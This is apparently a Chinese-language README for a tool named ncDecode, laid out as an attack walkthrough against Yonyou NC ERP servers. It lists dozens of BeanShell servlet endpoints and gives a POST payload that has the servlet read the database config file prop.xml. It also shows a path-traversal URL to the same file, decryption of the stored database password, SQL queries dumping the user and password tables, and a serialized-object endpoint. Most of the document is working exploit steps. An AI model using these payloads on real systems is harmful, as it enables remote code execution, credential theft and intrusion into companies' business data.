# ncDecode 
用友nc数据库密码解密

## WEB.xml

`/webapps/nc_web/WEB-INF/web.xml`

```
	<servlet-mapping>
	  <servlet-name>NCInvokerServlet</servlet-name>
	  <url-pattern>/service/*</url-pattern>
	</servlet-mapping>
	
	<servlet-mapping>
	  <servlet-name>NCInvokerServlet</servlet-name>
	  <url-pattern>/servlet/*</url-pattern>
	</servlet-mapping>
```

## bsh.servlet.BshServlet

```
http://x.x.x.x/service/~aim/bsh.servlet.BshServlet
http://x.x.x.x/service/~alm/bsh.servlet.BshServlet
http://x.x.x.x/service/~ampub/bsh.servlet.BshServlet
http://x.x.x.x/service/~arap/bsh.servlet.BshServlet
http://x.x.x.x/service/~aum/bsh.servlet.BshServlet
http://x.x.x.x/service/~cc/bsh.servlet.BshServlet
http://x.x.x.x/service/~cdm/bsh.servlet.BshServlet
http://x.x.x.x/service/~cmp/bsh.servlet.BshServlet
http://x.x.x.x/service/~ct/bsh.servlet.BshServlet
http://x.x.x.x/service/~dm/bsh.servlet.BshServlet
http://x.x.x.x/service/~erm/bsh.servlet.BshServlet
http://x.x.x.x/service/~fa/bsh.servlet.BshServlet
http://x.x.x.x/service/~fac/bsh.servlet.BshServlet
http://x.x.x.x/service/~fbm/bsh.servlet.BshServlet
http://x.x.x.x/service/~ff/bsh.servlet.BshServlet
http://x.x.x.x/service/~fip/bsh.servlet.BshServlet
http://x.x.x.x/service/~fipub/bsh.servlet.BshServlet
http://x.x.x.x/service/~fp/bsh.servlet.BshServlet
http://x.x.x.x/service/~fts/bsh.servlet.BshServlet
http://x.x.x.x/service/~fvm/bsh.servlet.BshServlet
http://x.x.x.x/service/~gl/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrhi/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrjf/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrpd/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrpub/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrtrn/bsh.servlet.BshServlet
http://x.x.x.x/service/~hrwa/bsh.servlet.BshServlet
http://x.x.x.x/service/~ia/bsh.servlet.BshServlet
http://x.x.x.x/service/~ic/bsh.servlet.BshServlet
http://x.x.x.x/service/~iufo/bsh.servlet.BshServlet
http://x.x.x.x/service/~modules/bsh.servlet.BshServlet
http://x.x.x.x/service/~mpp/bsh.servlet.BshServlet
http://x.x.x.x/service/~obm/bsh.servlet.BshServlet
http://x.x.x.x/service/~pu/bsh.servlet.BshServlet
http://x.x.x.x/service/~qc/bsh.servlet.BshServlet
http://x.x.x.x/service/~sc/bsh.servlet.BshServlet
http://x.x.x.x/service/~scmpub/bsh.servlet.BshServlet
http://x.x.x.x/service/~so/bsh.servlet.BshServlet
http://x.x.x.x/service/~so2/bsh.servlet.BshServlet
http://x.x.x.x/service/~so3/bsh.servlet.BshServlet
http://x.x.x.x/service/~so4/bsh.servlet.BshServlet
http://x.x.x.x/service/~so5/bsh.servlet.BshServlet
http://x.x.x.x/service/~so6/bsh.servlet.BshServlet
http://x.x.x.x/service/~tam/bsh.servlet.BshServlet
http://x.x.x.x/service/~tbb/bsh.servlet.BshServlet
http://x.x.x.x/service/~to/bsh.servlet.BshServlet
http://x.x.x.x/service/~uap/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapbd/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapde/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapeai/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapother/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapqe/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapweb/bsh.servlet.BshServlet
http://x.x.x.x/service/~uapws/bsh.servlet.BshServlet
http://x.x.x.x/service/~vrm/bsh.servlet.BshServlet
http://x.x.x.x/service/~yer/bsh.servlet.BshServlet
```

## cat prop.xml

```
http://x.x.x.x/service/~yer/bsh.servlet.BshServlet
POST:
bsh.script=cat("./ierp/bin/prop.xml");
```

## prop.xml

```
<dataSource>
<dataSourceName>nc</dataSourceName>
<oidMark>C2</oidMark>
<databaseUrl>jdbc:sqlserver://127.0.0.1:1433;database=nc;sendStringParametersAsUnicode=false</databaseUrl>
<user>nc</user>
<password>jlehfdffcfmohiag</password>
<driverClassName>com.microsoft.sqlserver.jdbc.SQLServerDriver</driverClassName>
<databaseType>SQLSERVER</databaseType>
<maxCon>50</maxCon>
<minCon>10</minCon>
<dataSourceClassName>nc.bs.mw.ejb.xares.IerpDataSource</dataSourceClassName>
<xaDataSourceClassName>nc.bs.mw.ejb.xares.IerpXADataSource</xaDataSourceClassName>
<conIncrement>0</conIncrement>
<conInUse>0</conInUse>
<conIdle>0</conIdle>
</dataSource>
```

## decode password

```
╰─$ java -jar 01-ncDatabase.jar
[*] 用友nc 数据库密码解密:
[*] 数据库配置文件: /NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
[*] Example: jlehfdffcfmohiag
[+] 请输入加密的数据库密文= jlehfdffcfmohiag
>>> 数据库明文密码= 1
[+] 请输入加密的数据库密文=
```

## query user
```
SELECT top 10 * FROM  nc..sm_user;
SELECT top 10 * FROM  nc..sm_userpassword;
```

## serialized

```
request:
GET /ServiceDispatcherServlet HTTP/1.1
response:
Content-Type: application/x-java-serialized-object
```
